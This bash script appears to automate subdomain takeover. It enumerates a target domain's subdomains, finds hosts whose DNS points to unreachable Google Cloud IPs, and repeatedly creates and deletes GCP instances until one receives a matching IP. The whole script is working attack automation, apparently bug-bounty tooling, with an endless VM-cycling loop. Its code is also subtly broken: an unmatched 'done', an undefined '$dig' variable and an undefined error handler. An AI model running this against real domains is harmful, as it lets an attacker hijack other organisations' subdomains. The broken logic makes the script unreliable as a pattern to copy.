#!/bin/bash
~/go/bin/httpx -update

# Initialize Variables
TARGET_TLD=""
PROJECT=""
ZONE=""

DIR=$(pwd)

# Parse Command-Line Args
while getopts ":t:p:z:" opt; do
    case "${opt}" in
        t)
            TARGET_TLD=${OPTARG}
            ;;
        p)
            PROJECT=${OPTARG}
            ;;
        z)
            ZONE=${OPTARG}
            ;;
        *)
            handle_exceptions
            ;;
    esac
done

# Run subfinder to check for new subdomains if any...
~/go/bin/subfinder -provider-config /"$HOME"/.config/subfinder/provider-config.yaml -d "$TARGET_TLD" | anew /"$DIR"/output/"$TARGET_TLD"/"$TARGET_TLD".txt > /"$DIR"/output/"$TARGET_TLD"/"$TARGET_TLD"-added-lines.txt
wordcount=$(wc -l < /"$DIR"/output/"$TARGET_TLD"/"$TARGET_TLD"-added-lines.txt)
if [[ "$wordcount" -ge 1 ]]
then
        #Add Newly discovered subdomains to $TARGET_TLD. appended... >> so that we don't see old new subdomains being found over and over.
        cat /"$DIR"/output/"$TARGET_TLD"/"$TARGET_TLD"-added-lines.txt >> /"$DIR"/output/"$TARGET_TLD"/"$TARGET_TLD".txt
else
        echo "Doing nothing" >/dev/null 2>&1
fi

httpx -l /"$DIR"/output/"$TARGET_TLD"/"$TARGET_TLD".txt -probe -ip | grep -i "failed" | sed -E 's/^\s*.*:\/\///g' | cut -f1 -d"[" >> /"$DIR"/output/"$TARGET_TLD"/"$TARGET_TLD".httpx.out

dig_out=$(dig -f /"$DIR"/output/"$TARGET_TLD"/"$TARGET_TLD".httpx.out +short)



if [[ "$dig_out" ]]
then
        nslookup=$(nslookup "$dig_out" | grep -i "googleusercontent")
        if [[ "$nslookup" && "$dig_out" ]]
        then
                echo "Found potential candidate(s) for Subdomain Takeover: "
                echo "$dig" >> /"$DIR"/output/"$TARGET_TLD"/potential_candidates.txt
        else
                echo "No IP addresses are pointing to any Google assets" >/dev/null 2>&1
        fi
else
        echo "No IP addresses returned" >/dev/null 2>&1
fi
done

grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" /"$DIR"/output/"$TARGET_TLD"/potential_candidates.txt > /"$DIR"/output/"$TARGET_TLD"/IP_Only.txt
target_IPS=$(cat /"$DIR"/output/"$TARGET_TLD"/IP_Only.txt)
wordcount2=$(wc -l < /"$DIR"/output/"$TARGET_TLD"/IP_Only.txt)

COUNT=0

while true; do
if [[ "$wordcount2" -ge 1 ]]
then
        ((COUNT++))
        printf "Number of Tries: "$COUNT"\n"
        # Create the GCP Instance
        gcloud compute instances create subdomain-takeovers-"$TARGET_TLD" \
        --project="$PROJECT" \
        --zone="$ZONE" \
        --machine-type=e2-medium \
        --network-interface=network-tier=PREMIUM,stack-type=IPV4_ONLY,subnet=default \
        --maintenance-policy=MIGRATE \
        --provisioning-model=STANDARD \
        --service-account=000000000000-compute@developer.gserviceaccount.com \
        --scopes=https://www.googleapis.com/auth/cloud-platform \
        --tags=http-server,https-server \
        --create-disk=auto-delete=yes,boot=yes,device-name=subdomain-takeovers-"$TARGET_TLD",image=projects/debian-cloud/global/images/debian-11-bullseye-v20240110,mode=rw,size=10,type=projects/"$PROJECT"/zones/"$ZONE"/diskTypes/pd-standard \
        --no-shielded-secure-boot \
        --shielded-vtpm \
        --shielded-integrity-monitoring \
        --labels=goog-ec-src=vm_add-gcloud \
        --reservation-affinity=any


        ip_response=$(gcloud compute instances describe subdomain-takeovers-"$TARGET_TLD" \
        --format='get(networkInterfaces[0].accessConfigs[0].natIP)' \
        --zone="$ZONE")

        gen_ip=$(grep "$ip_response" /"$DIR"/output/"$TARGET_TLD"/IP_Only.txt)
        if [[ "$gen_ip" ]]
        then
                echo "++Found a matching IP for the target at "$target_IPS""
        exit 0
        else
                echo "Deleting the newly generated VM instance with IP: "$ip_response" >>> Trying again.\n\n"
                gcloud compute instances delete subdomain-takeovers-"$TARGET_TLD" --zone="$ZONE" --verbosity=none --quiet > /dev/null 2>&1
                sleep 2
        fi
else
        echo "No potentially vulnerable subdomains for "$TARGET_TLD"" >/dev/null 2>&1
fi
done
